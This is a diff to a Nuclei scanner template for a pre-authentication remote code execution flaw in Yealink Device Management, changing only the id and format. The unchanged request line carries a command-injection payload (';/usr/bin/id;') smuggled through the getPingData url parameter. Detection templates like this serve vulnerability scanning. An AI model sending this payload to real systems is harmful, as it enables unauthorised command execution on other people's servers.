@@ -1,4 +1,5 @@
-id: YeaLink Device Management PreAuth RCE
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: YeaLink-Device-Management-PreAuth-RCE
 
 info:
   name: YeaLink DM PreAuth RCE
@@ -8,7 +9,7 @@ info:
   tags: rce,yealink,
   reference: unknown
 
-requests:
+http:
   - method: GET
     path:
       - "https://{{BaseURL}}/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;"
